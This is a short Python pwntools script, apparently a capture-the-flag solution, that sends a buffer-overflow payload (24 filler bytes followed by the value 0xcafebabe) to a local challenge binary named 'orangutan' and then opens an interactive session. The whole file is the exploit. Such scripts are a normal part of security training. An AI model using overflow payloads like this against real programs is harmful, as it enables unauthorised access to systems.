#!/usr/bin/python3

from pwn import *


p = process("./orangutan")
payload  = b""
payload += b"A"*24
payload += p64(0xcafebabe)

p.sendline(payload)

p.interactive()
